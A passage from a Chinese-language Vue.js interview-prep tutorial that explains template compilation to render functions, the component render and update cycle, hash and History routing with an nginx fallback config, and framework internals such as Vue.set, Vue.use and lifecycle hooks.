模板编译</h3>\\n<p><strong>前置知识</strong></p>\\n<ul>\\n<li>模板是<code>vue</code>开发中最常用的，即与使用相关联的原理</li>\\n<li>它不是<code>HTML</code>，有指令、插值、JS表达式，能实现循环、判断，因此模板一定转为<code>JS</code>代码，即模板编译</li>\\n<li>面试不会直接问，但会通过<code>组件渲染和更新过程</code>考察</li>\\n</ul>\\n<p><strong>模板编译</strong></p>\\n<ul>\\n<li><code>vue template compiler</code>将模板编译为<code>render</code>函数</li>\\n<li>执行<code>render</code>函数，生成<code>vnode</code></li>\\n<li>基于<code>vnode</code>在执行<code>patch</code>和<code>diff</code></li>\\n<li>使用<code>webpack vue loader</code>，会在开发环境下编译模板</li>\\n</ul>\\n<p><strong>with语法</strong></p>\\n<p><img src=\\"https://s.poetries.top/uploads/2023/02/6f9943fe553bfa0a.png\\" alt=\\"\\"></p>\\n<ul>\\n<li>改变<code>{}</code>内自由变量的查找规则，当做<code>obj</code>属性来查找</li>\\n<li>如果找不到匹配的<code>obj</code>属性，就会报错</li>\\n<li><code>with</code>要慎用，它打破了作用域规则，易读性变差</li>\\n</ul>\\n<p><strong>vue组件中使用render代替template</strong></p>\\n<p><img src=\\"https://s.poetries.top/uploads/2023/02/84a8702352c0d1a7.png\\" alt=\\"\\"></p>\\n<pre class=\\"language-js\\"><code>// 执行 node index.js\\n\\nconst compiler = require(&#39;vue-template-compiler&#39;)\\n\\n// 插值\\nconst template = `&lt;p&gt;{{message}}&lt;/p&gt;`\\nwith(this){return _c(&#39;p&#39;, [_v(_s(message))])}\\n// this就是vm的实例, message等变量会从vm上读取，触发getter\\n// _c =&gt; createElement 也就是h函数 =&gt; 返回vnode\\n// _v =&gt; createTextVNode \\n// _s =&gt; toString \\n// 也就是这样 with(this){return createElement(&#39;p&#39;,[createTextVNode(toString(message))])}\\n\\n// h -&gt; vnode\\n// createElement -&gt; vnode\\n\\n// 表达式\\nconst template = `&lt;p&gt;{{flag ? message : &#39;no message found&#39;}}&lt;/p&gt;`\\n// with(this){return _c(&#39;p&#39;,[_v(_s(flag ? message : &#39;no message found&#39;))])}\\n\\n// 属性和动态属性\\nconst template = `\\n    &lt;div id=&quot;div1&quot; class=&quot;container&quot;&gt;\\n        &lt;img :src=&quot;imgUrl&quot;/&gt;\\n    &lt;/div&gt;\\n`\\nwith(this){return _c(&#39;div&#39;,\\n     {staticClass:&quot;container&quot;,attrs:{&quot;id&quot;:&quot;div1&quot;}},\\n     [\\n         _c(&#39;img&#39;,{attrs:{&quot;src&quot;:imgUrl}})])}\\n\\n// 条件\\nconst template = `\\n    &lt;div&gt;\\n        &lt;p v-if=&quot;flag === &#39;a&#39;&quot;&gt;A&lt;/p&gt;\\n        &lt;p v-else&gt;B&lt;/p&gt;\\n    &lt;/div&gt;\\n`\\nwith(this){return _c(&#39;div&#39;,[(flag === &#39;a&#39;)?_c(&#39;p&#39;,[_v(&quot;A&quot;)]):_c(&#39;p&#39;,[_v(&quot;B&quot;)])])}\\n\\n// 循环\\nconst template = `\\n    &lt;ul&gt;\\n        &lt;li v-for=&quot;item in list&quot; :key=&quot;item.id&quot;&gt;{{item.title}}&lt;/li&gt;\\n    &lt;/ul&gt;\\n`\\nwith(this){return _c(&#39;ul&#39;,_l((list),function(item){return _c(&#39;li&#39;,{key:item.id},[_v(_s(item.title))])}),0)}\\n\\n// 事件\\nconst template = `\\n    &lt;button @click=&quot;clickHandler&quot;&gt;submit&lt;/button&gt;\\n`\\nwith(this){return _c(&#39;button&#39;,{on:{&quot;click&quot;:clickHandler}},[_v(&quot;submit&quot;)])}\\n\\n// v-model\\nconst template = `&lt;input type=&quot;text&quot; v-model=&quot;name&quot;&gt;`\\n// 主要看 input 事件\\nwith(this){return _c(&#39;input&#39;,{directives:[{name:&quot;model&quot;,rawName:&quot;v-model&quot;,value:(name),expression:&quot;name&quot;}],attrs:{&quot;type&quot;:&quot;text&quot;},domProps:{&quot;value&quot;:(name)},on:{&quot;input&quot;:function($event){if($event.target.composing)return;name=$event.target.value}}})}\\n\\n// render 函数\\n// 返回 vnode\\n// patch\\n\\n// 编译\\nconst res = compiler.compile(template)\\nconsole.log(res.render)\\n\\n// ---------------分割线--------------\\n\\n// 从 vue 源码中找到缩写函数的含义\\nfunction installRenderHelpers (target) {\\n    target._o = markOnce;\\n    target._n = toNumber;\\n    target._s = toString;\\n    target._l = renderList;\\n    target._t = renderSlot;\\n    target._q = looseEqual;\\n    target._i = looseIndexOf;\\n    target._m = renderStatic;\\n    target._f = resolveFilter;\\n    target._k = checkKeyCodes;\\n    target._b = bindObjectProps;\\n    target._v = createTextVNode;\\n    target._e = createEmptyVNode;\\n    target._u = resolveScopedSlots;\\n    target._g = bindObjectListeners;\\n    target._d = bindDynamicKeys;\\n    target._p = prependModifier;\\n}\\n</code></pre>\\n<h3 id=\\"组件渲染更新过程-重点掌握\\"><a class=\\"header-anchor\\" href=\\"#组件渲染更新过程-重点掌握\\">#</a> 组件渲染更新过程（重点掌握）</h3>\\n<p><strong>前言</strong></p>\\n<ul>\\n<li>一个组件渲染到页面，修改<code>data</code>触发更新（数据驱动视图）</li>\\n<li>其背后原理是什么，需要掌握哪些点</li>\\n<li>考察对流程了解的全面程度</li>\\n</ul>\\n<p><strong>回顾三大核心知识点</strong></p>\\n<ul>\\n<li><strong>响应式</strong>：监听<code>data</code>属性<code>getter</code>、<code>setter</code>（包括数组）</li>\\n<li><strong>模板编译</strong>：模板到<code>render</code>函数，再到<code>vnode</code></li>\\n<li><strong>vdom</strong>：两种用法\\n<ul>\\n<li><code>patch(elem,vnode)</code> 首次渲染<code>vnode</code>到<code>container</code>上</li>\\n<li><code>patch(vnode、newVnode)</code> 新的<code>vnode</code>取更新旧的<code>vnode</code></li>\\n</ul>\\n</li>\\n<li>搞定这三点核心原理，<code>vue</code>原理不是问题</li>\\n</ul>\\n<p><strong>组件渲染更新过程</strong></p>\\n<ul>\\n<li><strong>1. 初次渲染过程</strong>\\n<ul>\\n<li>解析模板为<code>render</code>函数（或在开发环境已经完成<code>vue-loader</code>）</li>\\n<li>触发响应式，监听<code>data</code>属性<code>getter</code>、<code>setter</code></li>\\n<li>执行<code>render</code>函数（执行<code>render</code>函数过程中，会获取<code>data</code>的属性触发<code>getter</code>），生成<code>vnode</code>，在执行<code>patch(elem,vnode)</code> <code>elem</code>组件对应的<code>dom</code>节点\\n<ul>\\n<li><code>const template = &lt;p&gt;{{message}}&lt;/p&gt;</code></li>\\n<li>编译为<code>render</code>函数 <code>with(this){return _c(\'p\', [_v(_s(message))])}</code></li>\\n<li><code>this</code>就是<code>vm</code>的实例, <code>message</code>等变量会从<code>vm</code>上读取，触发<code>getter</code>进行依赖收集</li>\\n</ul>\\n<pre class=\\"language-js\\"><code>export default {\\n    data() {\\n        return {\\n            message: &#39;hello&#39; // render函数执行过程中会获取message变量值，触发getter\\n        }\\n    }\\n}\\n</code></pre>\\n</li>\\n</ul>\\n</li>\\n<li><strong>2. 更新过程</strong>\\n<ul>\\n<li>修改<code>data</code>，触发<code>setter</code>（此前在<code>getter</code>中已被监听）</li>\\n<li>重新执行<code>render</code>函数，生成<code>newVnode</code></li>\\n<li>在调用<code>patch(oldVnode, newVnode)</code>算出最小差异，进行更新</li>\\n</ul>\\n</li>\\n<li><strong>3. 完成流程图</strong>\\n<img src=\\"https://s.poetries.top/uploads/2023/02/94729fa5b9fcb082.png\\" alt=\\"\\"></li>\\n</ul>\\n<p><strong>异步渲染</strong></p>\\n<ul>\\n<li>汇总<code>data</code>的修改，一次更新视图</li>\\n<li>减少<code>DOM</code>操作次数，提高性能</li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/uploads/2023/02/6c8606aaa99af5cb.png\\" alt=\\"\\"></p>\\n<pre class=\\"language-js\\"><code>methods: {\\n    addItem() {\\n        this.list.push(`${Date.now()}`)\\n        this.list.push(`${Date.now()}`)\\n        this.list.push(`${Date.now()}`)\\n\\n        // 1.页面渲染是异步的，$nextTick待渲染完在回调\\n        // 2.页面渲染时会将data的修改做整合，多次data修改也只会渲染一次\\n        this.$nextTick(()=&gt;{\\n            const ulElem = this.$refs.ul\\n            console.log(ulElem.childNotes.length)\\n        })\\n    }\\n}\\n</code></pre>\\n<p><strong>总结</strong></p>\\n<ul>\\n<li>渲染和响应式的关系</li>\\n<li>渲染和模板编译的关系</li>\\n<li>渲染和<code>vdom</code>的关系</li>\\n</ul>\\n<h3 id=\\"前端路由原理\\"><a class=\\"header-anchor\\" href=\\"#前端路由原理\\">#</a> 前端路由原理</h3>\\n<p><strong>hash的特点</strong></p>\\n<ul>\\n<li><code>hash</code>变化会触发网页跳转，即浏览器的前进和后退</li>\\n<li><code>hash</code>变化不会刷新页面，<code>SPA</code>必须的特点</li>\\n<li><code>hash</code>永远不会提交到<code>server</code>端</li>\\n<li>通过<code>onhashchange</code>监听</li>\\n</ul>\\n<p><strong>H5 History</strong></p>\\n<ul>\\n<li>用<code>url</code>规范的路由，但跳转时不刷新页面</li>\\n<li>通过<code>history.pushState</code>和<code>history.onpopstate</code>监听</li>\\n<li><code>H5 History</code>需要后端支持\\n<ul>\\n<li>当我们进入到子路由时刷新页面，<code>web</code>容器没有相对应的页面此时会出现<code>404</code></li>\\n<li>所以我们只需要配置将任意页面都重定向到 <code>index.html</code>，把路由交由前端处理</li>\\n<li>对<code>nginx</code>配置文件<code>.conf</code>修改，添加<code>try_files $uri $uri/ /index.html;</code></li>\\n</ul>\\n<pre class=\\"language-nginx\\"><code>server {\\n  listen  80;\\n  server_name  www.xxx.com;\\n\\n  location / {\\n    index  /data/dist/index.html;\\n    try_files $uri $uri/ /index.html;\\n  }\\n}\\n</code></pre>\\n</li>\\n</ul>\\n<p><strong>两者选择</strong></p>\\n<ul>\\n<li><code>to B</code>系统推荐使用hash，简单易用，对<code>url</code>规范不敏感</li>\\n<li><code>to C</code>系统，可以考虑使用<code>H5 History</code>，但需要服务端支持</li>\\n<li>能选择简单的，就别用复杂的，要考虑成本和收益</li>\\n</ul>\\n<pre class=\\"language-js\\"><code>// hash 变化，包括：\\n// a. JS 修改 url\\n// b. 手动修改 url 的 hash\\n// c. 浏览器前进、后退\\nwindow.onhashchange = (event) =&gt; {\\n    console.log(&#39;old url&#39;, event.oldURL)\\n    console.log(&#39;new url&#39;, event.newURL)\\n\\n    console.log(&#39;hash:&#39;, location.hash)\\n}\\n\\n// 页面初次加载，获取 hash\\ndocument.addEventListener(&#39;DOMContentLoaded&#39;, () =&gt; {\\n    console.log(&#39;hash:&#39;, location.hash)\\n})\\n\\n// JS 修改 url\\ndocument.getElementById(&#39;btn1&#39;).addEventListener(&#39;click&#39;, () =&gt; {\\n    location.href = &#39;#/user&#39;\\n})\\n</code></pre>\\n<pre class=\\"language-js\\"><code>// history API\\n\\n// 页面初次加载，获取 path\\ndocument.addEventListener(&#39;DOMContentLoaded&#39;, () =&gt; {\\n    console.log(&#39;load&#39;, location.pathname)\\n})\\n\\n// 打开一个新的路由\\n// 【注意】用 pushState 方式，浏览器不会刷新页面\\ndocument.getElementById(&#39;btn1&#39;).addEventListener(&#39;click&#39;, () =&gt; {\\n    const state = { name: &#39;page1&#39; }\\n    console.log(&#39;切换路由到&#39;, &#39;page1&#39;)\\n    history.pushState(state, &#39;&#39;, &#39;page1&#39;) // 重要！！\\n})\\n\\n// 监听浏览器前进、后退\\nwindow.onpopstate = (event) =&gt; { // 重要！！\\n    console.log(&#39;onpopstate&#39;, event.state, location.pathname)\\n}\\n\\n// 需要 server 端配合，可参考\\n// https://router.vuejs.org/zh/guide/essentials/history-mode.html#%E5%90%8E%E7%AB%AF%E9%85%8D%E7%BD%AE%E4%BE%8B%E5%AD%90\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>运营后台使用 <code>hash</code> 路由，产品担心切换 <code>#/orders</code> 会把这段路径提交给服务端并触发页面刷新；你怎么判断？</strong></p>\\n<p>这个担心不成立，<code>URL</code> 的 <code>hash</code> 不会提交到服务端，变化本身也不会刷新页面。前端可通过 <code>hashchange</code> 监听脚本修改、手工修改以及前进后退造成的变化；但首次加载仍要主动读取 <code>location.hash</code> 来完成初始匹配。</p>\\n</li>\\n<li>\\n<p><strong>内容站要求地址显示为 <code>/article/42</code> 而不是 <code>#/article/42</code>，前端准备用 <code>History</code> 模式，你会要求服务端同步做什么？</strong></p>\\n<p>服务端需要把无法匹配到真实静态文件的前端路由回退到 <code>index.html</code>，再由前端完成路由解析。<code>Nginx</code> 可在站点位置配置 <code>try_files $uri $uri/ /index.html;</code>；若无回退规则，用户直接访问或刷新子路由会收到 <code>404</code>。</p>\\n</li>\\n<li>\\n<p><strong>一个部署在无法修改服务器配置的旧内网系统，希望 <code>URL</code> 规范且刷新任意子路由不报错；<code>hash</code> 和 <code>History</code> 模式怎么取舍？</strong></p>\\n<p>在不能配置服务端回退的约束下，优先选择 <code>hash</code>，因为片段不会发往服务器，刷新时服务端仍只处理入口页面。<code>History</code> 模式虽然 <code>URL</code> 更规范，但依赖服务端把子路径交回 <code>index.html</code>；无法满足这个前提时，规范外观不足以抵消刷新失败风险。</p>\\n</li>\\n<li>\\n<p><strong>开发者调用 <code>history.pushState(state, \'\', \'/page1\')</code> 后等待 <code>popstate</code> 立即渲染新页面，结果监听器没有执行；你会怎么定位？</strong></p>\\n<p><code>pushState</code> 会修改地址且不刷新页面，但不会依靠一次立即触发的 <code>popstate</code> 来完成当前跳转渲染。代码应在调用后主动执行路由匹配，而 <code>popstate</code> 主要处理浏览器前进和后退；若只把渲染逻辑放在监听器中，程序化导航就会出现地址变了而页面没变。</p>\\n</li>\\n<li>\\n<p><strong>面向企业内部的管理系统与公开内容站同时选路由模式，架构组要求统一使用 <code>History</code> 模式以减少维护，你会接受吗？</strong></p>\\n<p>不应只为统一而忽略部署与产品约束，内部系统对 <code>URL</code> 规范不敏感时，<code>hash</code> 简单且不要求服务端回退。公开内容站可考虑 <code>History</code> 模式以获得常规路径形式，但必须配套服务端支持；统一方案减少的维护成本可能转化为部署复杂度和刷新故障风险。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_68-vue面试考点答题分析\\"><a class=\\"header-anchor\\" href=\\"#_68-vue面试考点答题分析\\">#</a> 68 Vue面试考点答题分析</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>答题结构：<strong>先给结论 → 再讲原理 → 补边界和代价 → 落到实际场景</strong>，别一上来就背源码</li>\\n<li>版本要说清：涉及响应式、<code>diff</code>、生命周期时，主动区分 <code>Vue 2</code> 和 <code>Vue 3</code> 的差异，并说明为什么改</li>\\n<li>开放题（性能优化、项目架构、最佳实践）要<strong>有结构 + 有数字</strong>：分类讲 + 挑两三条给具体场景和收益</li>\\n<li>被追问不会时，说清&quot;我会怎么查&quot;比硬编强 —— 面试官在意的是排查思路而不是记忆量</li>\\n<li>准备三个素材：一个踩过的坑、一个带数字的优化、一个技术选型的取舍 —— 几乎所有追问都能落到这三个上</li>\\n</ul>\\n<p><strong>这些考点本质上都在追问：<code>Vue</code> 如何把数据变化转换成可控的视图更新。</strong> <code>Vue 2</code> 通过 <code>Dep</code> 和 <code>Watcher</code> 完成依赖收集与通知，数组、<code>computed</code>、<code>watch</code>、<code>nextTick</code> 都是在这套机制上解决不同问题。模板会先转成 <code>AST</code>，再生成 <code>render</code> 函数；渲染时由虚拟 <code>DOM</code> 和同层 <code>diff</code> 控制真实节点更新。遇到 <code>mixin</code>、插件或路由守卫，还要说明合并冲突、重复安装和钩子执行边界。</p>\\n</section>\\n<h3 id=\\"请说一下响应式数据的理解\\"><a class=\\"header-anchor\\" href=\\"#请说一下响应式数据的理解\\">#</a> 请说一下响应式数据的理解</h3>\\n<p><strong>参考答案</strong></p>\\n<ul>\\n<li>核心点考察的是：数组和对象类型当值变化时如何劫持到。对象内部通过<code>defineReactive</code>方法，使用<code>Object.defineProperty</code>将属性进行劫持（只会劫持已经存在的属性），数组则是通过重写数组方法来实现。 这里在回答时可以带出一些相关知识点（比如多层对象是通过递归来实现劫持，顺带提出<code>Vue3</code>中是使用<code>proxy</code>来实现响应式数据）</li>\\n<li>核心点答出来了也可以在进行补充回答，内部依赖收集是怎样做到的，每个属性都拥有自己的<code>dep</code>属性，存放他所依赖的<code>watcher</code>，当属性变化后会通知自己对应的<code>watcher</code>去更新</li>\\n<li>这里可以引出性能优化相关的内容\\n<ul>\\n<li>对象层级过深，性能就会差</li>\\n<li>不需要响应数据的内容不要放到<code>data</code>中</li>\\n<li><code>Object.freeze()</code> 可以冻结数据</li>\\n</ul>\\n</li>\\n</ul>\\n<h3 id=\\"vue如何检测数组变化\\"><a class=\\"header-anchor\\" href=\\"#vue如何检测数组变化\\">#</a> Vue如何检测数组变化</h3>\\n<ul>\\n<li>核心点考察的是：数组考虑性能原因没有用<code>defineProperty</code>对数组的每一项进行拦截，而是选择重写数组（<code>push</code>,<code>shift</code>,<code>pop</code>,<code>splice</code>,<code>unshift</code>,<code>sort</code>,<code>reverse</code>）方法进行重写</li>\\n<li>核心点答出来了也可以在进行补充回答，在<code>Vue</code>中修改数组的索引和长度是无法监控到的。需要通过以上<code>7</code>种变异方法修改数组才会触发数组对应的<code>watcher</code>进行更新。数组中如果是对象数据类型也会进行递归劫持</li>\\n<li>引发出的问题，那如果想更改索引更新数据怎么办？可以通过<code>Vue.$set()</code>来进行处理 =&gt; 核心内部用的是<code>splice</code>方法</li>\\n</ul>\\n<h3 id=\\"vue中模板编译原理\\"><a class=\\"header-anchor\\" href=\\"#vue中模板编译原理\\">#</a> Vue中模板编译原理</h3>\\n<p>`</p>\\n<ul>\\n<li>核心点考察的是：如何将<code>template</code>转换成<code>render</code>函数(这里要注意的是我们在开发时尽量不要使用<code>template</code>，因为将<code>template</code>转化成<code>render</code>方法需要在运行时进行编译操作会有性能损耗，同时引用带有<code>compiler</code>包的<code>vue</code>体积也会变大。默认<code>.vue</code>文件中的<code>template</code>处理是通过<code>vue-loader</code>来进行处理的并不是通过运行时的编译 - 后面我们会说到默认<code>vue</code>项目中引入的<code>vue.js</code>是不带有<code>compiler</code>模块的)</li>\\n<li><strong>模板编译过程</strong>\\n<ul>\\n<li>将<code>template</code>模板转换成<code>ast</code>语法树 - <code>parserHTML</code></li>\\n<li>对静态语法做静态标记 - <code>markUp</code></li>\\n<li>重新生成代码 - <code>codeGen</code></li>\\n<li>核心点答出来了也可以在进行补充回答 （模板引擎的实现原理就是<code>new Function + with</code>来进行实现的）</li>\\n</ul>\\n<pre class=\\"language-js\\"><code>function compileToFunctions(template) {\\n  // 我们需要把html字符串变成render函数\\n  // 1.把html代码转成ast语法树  ast用来描述代码本身形成树结构 不仅可以描述html 也能描述css以及js语法\\n  // 很多库都运用到了ast 比如 webpack babel eslint等等\\n  let ast = parse(template);\\n  // 2.优化静态节点：对ast树进行标记,标记静态节点\\n    if (options.optimize !== false) {\\n      optimize(ast, options);\\n    }\\n\\n  // 3.通过ast 重新生成代码\\n  // 我们最后生成的代码需要和render函数一样\\n  // 类似_c(&#39;div&#39;,{id:&quot;app&quot;},_c(&#39;div&#39;,undefined,_v(&quot;hello&quot;+_s(name)),_c(&#39;span&#39;,undefined,_v(&quot;world&quot;))))\\n  // _c代表创建元素 _v代表创建文本 _s代表文Json.stringify--把对象解析成文本\\n  let code = generate(ast);\\n  //   使用with语法改变作用域为this  之后调用render函数可以使用call改变this 方便code里面的变量取值\\n  let renderFn = new Function(`with(this){return ${code}}`);\\n  return renderFn;\\n}\\n</code></pre>\\n<ul>\\n<li><code>vue-loader</code>中处理<code>template</code>属性主要靠的是<code>vue-template-compiler</code>模块</li>\\n</ul>\\n<pre class=\\"language-js\\"><code>const VueTemplateCompiler = require(&#39;vue-template-compiler&#39;);\\nconst {render} = VueTemplateCompiler.compile(&quot;&lt;div id=&quot;hello&quot;&gt;{{msg}}&lt;/div&gt;&quot;);\\nconsole.log(render.toString())\\n</code></pre>\\n</li>\\n</ul>\\n<h3 id=\\"生命周期钩子是如何实现的\\"><a class=\\"header-anchor\\" href=\\"#生命周期钩子是如何实现的\\">#</a> 生命周期钩子是如何实现的</h3>\\n<ul>\\n<li>核心点考察的是：<code>Vue</code>的生命周期钩子就是回调函数而已，当创建组件实例的过程中会调用对应的钩子方法</li>\\n<li>核心点答出来了也可以在进行补充回答：内部主要是使用<code>callHook</code>方法来调用对应的方法。核心是一个发布订阅模式，将钩子订阅好（内部采用数组的方式存储），在对应的阶段进行发布</li>\\n</ul>\\n<pre class=\\"language-js\\"><code>export function callHook(vm, hook) {\\n  // 依次执行生命周期对应的方法\\n  const handlers = vm.$options[hook];\\n  if (handlers) {\\n    for (let i = 0; i &lt; handlers.length; i++) {\\n      handlers[i].call(vm); //生命周期里面的this指向当前实例\\n    }\\n  }\\n}\\n\\n// 调用的时候\\nVue.prototype._init = function (options) {\\n  const vm = this;\\n  vm.$options = mergeOptions(vm.constructor.options, options);\\n  callHook(vm, &quot;beforeCreate&quot;); //初始化数据之前\\n  // 初始化状态\\n  initState(vm);\\n  callHook(vm, &quot;created&quot;); //初始化数据之后\\n  if (vm.$options.el) {\\n    vm.$mount(vm.$options.el);\\n  }\\n};\\n\\n// 销毁实例实现\\nVue.prototype.$destory = function() {\\n\\t // 触发钩子\\n    callHook(vm, &#39;beforeDestory&#39;)\\n    // 自身及子节点\\n    remove() \\n    // 删除依赖\\n    watcher.teardown() \\n    // 删除监听\\n    vm.$off() \\n    // 触发钩子\\n    callHook(vm, &#39;destoryed&#39;)\\n}\\n</code></pre>\\n<h3 id=\\"vue-mixin的使用场景和原理\\"><a class=\\"header-anchor\\" href=\\"#vue-mixin的使用场景和原理\\">#</a> Vue.mixin的使用场景和原理</h3>\\n<ul>\\n<li>核心点考察的是：<code>Vue.mixin</code>的作用就是抽离公共的业务逻辑，原理类似“对象的继承”，当组件初始化时会调用<code>mergeOptions</code>方法进行合并，采用策略模式针对不同的属性进行合并。如果混入的数据和本身组件中的数据冲突，会采用“就近原则”以组件的数据为准</li>\\n<li>核心点答出来了也可以在进行补充回答：<code>mixin</code>中有很多缺陷 &quot;命名冲突问题&quot;、&quot;依赖问题&quot;、&quot;数据来源问题&quot;,这里强调一下<code>mixin</code>的数据是不会被共享的</li>\\n</ul>\\n<h3 id=\\"nexttick在哪里使用-原理是\\"><a class=\\"header-anchor\\" href=\\"#nexttick在哪里使用-原理是\\">#</a> nextTick在哪里使用?原理是</h3>\\n<ul>\\n<li>核心点考察的是：<code>nextTick</code>中的回调是在下次 <code>DOM</code> 更新循环结束之后执行的延迟回调。在修改数据之后立即使用这个方法，获取更新后的 <code>DOM</code>。原理就是异步方法(<code>promise</code>,<code>mutationObserver</code>,<code>setImmediate</code>,<code>setTimeout</code>)经常与事件环一起来问(宏任务和微任务)</li>\\n<li>核心点答出来了也可以在进行补充回答：<code>vue</code>多次更新数据，最终会进行批处理更新。内部调用的就是<code>nextTick</code>实现了延迟更新，用户自定义的<code>nextTick</code>中的回调会被延迟到更新完成后调用，从而可以获取更新后的<code>DOM</code></li>\\n</ul>\\n<h3 id=\\"vue为什么需要虚拟dom\\"><a class=\\"header-anchor\\" href=\\"#vue为什么需要虚拟dom\\">#</a> Vue为什么需要虚拟DOM</h3>\\n<ul>\\n<li>核心点考察的是：<code>Virtual DOM</code>就是用<code>js</code>对象来描述真实<code>DOM</code>，是对真实<code>DOM</code>的抽象，由于直接操作<code>DOM</code>性能低但是<code>js</code>层的操作效率高，可以将<code>DOM</code>操作转化成对象操作，最终通过<code>diff</code>算法比对差异进行更新<code>DOM</code>（减少了对真实<code>DOM</code>的操作）。虚拟<code>DOM</code>不依赖真实平台环境从而也可以实现跨平台。</li>\\n<li>核心点答出来了也可以在进行补充回答：虚拟<code>DOM</code>的实现就是普通对象包含<code>tag</code>、<code>attrs</code>、<code>children</code>等属性对真实节点的描述。（本质上就是在<code>JS</code>和<code>DOM</code>之间的一个缓存）</li>\\n</ul>\\n<h3 id=\\"vue中的diff原理\\"><a class=\\"header-anchor\\" href=\\"#vue中的diff原理\\">#</a> Vue中的diff原理</h3>\\n<blockquote>\\n<p>核心点考察的是：<code>Vue</code>的<code>diff</code>算法是平级比较，不考虑跨级比较的情况。内部采用<code>深度递归的方式 + 双指针</code>的方式进行比较</p>\\n</blockquote>\\n<p><strong>比较过程</strong></p>\\n<ol>\\n<li>先比较是否是相同节点</li>\\n<li>相同节点比较属性,并复用老节点</li>\\n<li>比较儿子节点，考虑老节点和新节点儿子的情况</li>\\n<li>优化比较：<code>头头</code>、<code>尾尾</code>、<code>头尾</code>、<code>尾头</code></li>\\n<li>比对查找进行复用</li>\\n</ol>\\n<p><code>Vue3</code>中采用最长递增子序列实现<code>diff</code>算法</p>\\n<h3 id=\\"vue中computed和watch的区别\\"><a class=\\"header-anchor\\" href=\\"#vue中computed和watch的区别\\">#</a> Vue中computed和watch的区别</h3>\\n<ul>\\n<li>核心点考察的是：<code>computed</code>和<code>watch</code>都是基于<code>Watcher</code>来实现的，分别是计算属性<code>watcher</code>和用户<code>watcher</code>。<code>computed</code>属性是具备缓存的，依赖的值不发生变化，对其取值时计算属性方法不会重新执行（可以用模板渲染，取值的过程中不支持异步方法）<code>watch</code>则是监控值的变化，当值发生变化时调用对应的回调函数</li>\\n<li>核心点答出来了也可以在进行补充回答：<code>computed</code>不会立即执行，内部通过<code>defineProperty</code>进行定义。并且通过<code>dirty</code>属性来检测依赖的数据是否发生变化。<code>watch</code>则是立即执行将老值保存在<code>watcher</code>上，当数据更新时重新计算新值，将新值和老值传递到回调函数中</li>\\n</ul>\\n<h3 id=\\"vue-set方法是如何实现的\\"><a class=\\"header-anchor\\" href=\\"#vue-set方法是如何实现的\\">#</a> Vue.set方法是如何实现的</h3>\\n<blockquote>\\n<p>核心点考察的是：为什么<code>$set</code>可以触发更新,我们给对象和数组本身都增加了<code>dep</code>属性。当给对象新增不存在的属性则触发对象依赖的<code>watcher</code>去更新，当修改数组索引时我们调用数组本身的<code>splice</code>方法去更新数组</p>\\n</blockquote>\\n<pre class=\\"language-js\\"><code>export function set (target: Array | Object, key: any, val: any): any {\\n  // 1.是开发环境 target 没定义或者是基础类型则报错\\n  if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp;\\n      (isUndef(target) || isPrimitive(target))\\n  ) {\\n      warn(`Cannot set reactive property on undefined, null, or primitive value: ${(target: any)}`)\\n  }\\n  // 2.如果是数组 Vue.set(array,1,100); 调用我们重写的splice方法 (这样可以更新视图)\\n  if (Array.isArray(target) &amp;&amp; isValidArrayIndex(key)) {\\n      target.length = Math.max(target.length, key)\\n      target.splice(key, 1, val)\\n      return val\\n  }\\n  // 3.如果是对象本身的属性，则直接添加即可\\n  if (key in target &amp;&amp; !(key in Object.prototype)) {\\n      target[key] = val\\n      return val\\n  }\\n  const ob = (target: any).__ob__\\n  // 4.如果是Vue实例 或 根数据data时 报错\\n  if (target._isVue || (ob &amp;&amp; ob.vmCount)) {\\n      process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; warn(\\n      &#39;Avoid adding reactive properties to a Vue instance or its root $data &#39; +\\n      &#39;at runtime - declare it upfront in the data option.&#39;\\n      )\\n      return val\\n  }\\n  // 5.如果不是响应式的也不需要将其定义成响应式属性\\n  if (!ob) {\\n      target[key] = val\\n      return val\\n  }\\n  // 6.将属性定义成响应式的\\n  defineReactive(ob.value, key, val)\\n  // 7.通知视图更新\\n  ob.dep.notify()\\n  return val\\n}\\n</code></pre>\\n<h3 id=\\"vue-use是干什么的-原理是什么\\"><a class=\\"header-anchor\\" href=\\"#vue-use是干什么的-原理是什么\\">#</a> Vue.use是干什么的?原理是什么</h3>\\n<blockquote>\\n<p>核心点考察的是：<code>Vue.use</code>是用来使用插件的，我们可以在插件中扩展全局组件、指令、原型方法等</p>\\n</blockquote>\\n<pre class=\\"language-js\\"><code>Vue.use = function (plugin: Function | Object) {\\n  // 插件不能重复的加载\\n  const installedPlugins = (this._installedPlugins || (this._installedPlugins = []))\\n  if (installedPlugins.indexOf(plugin) &gt; -1) {\\n      return this\\n  }\\n  // additional parameters\\n  const args = toArray(arguments, 1)\\n  args.unshift(this)  // install方法的第一个参数是Vue的构造函数，其他参数是Vue.use中除了第一个参数的其他参数\\n  if (typeof plugin.install === &#39;function&#39;) { // 调用插件的install方法\\n      plugin.install.apply(plugin, args)  Vue.install = function(Vue,args){}\\n  } else if (typeof plugin === &#39;function&#39;) { // 插件本身是一个函数，直接让函数执行\\n      plugin.apply(null, args) \\n  }\\n  installedPlugins.push(plugin) // 缓存插件\\n  return this\\n}\\n</code></pre>\\n<h3 id=\\"vue-router有几种钩子函数-具体是什么及执行流程是怎样的\\"><a class=\\"header-anchor\\" href=\\"#vue-router有几种钩子函数-具体是什么及执行流程是怎样的\\">#</a> vue-router有几种钩子函数?具体是什么及执行流程是怎样的</h3>\\n<blockquote>\\n<p>核心点考察的是：路由钩子的执行流程, 钩子函数种类有: <code>全局守卫</code>、<code>路由守卫</code>、<code>组件守卫</code></p>\\n</blockquote>\\n<p><strong>完整的导航解析流程</strong></p>\\n<ol>\\n<li>导航被触发</li>\\n<li>在失活的组件里调用 <code>beforeRouteLeave</code> 守卫</li>\\n<li>调用全局的 <code>beforeEach</code> 守卫</li>\\n<li>在重用的组件里调用 <code>beforeRouteUpdate</code> 守卫 (<code>2.2+)</code></li>\\n<li>在路由配置里调用 <code>beforeEnter</code></li>\\n<li>解析异步路由组件</li>\\n<li>在被激活的组件里调用 <code>beforeRouteEnter</code></li>\\n<li>调用全局的 <code>beforeResolve</code> 守卫 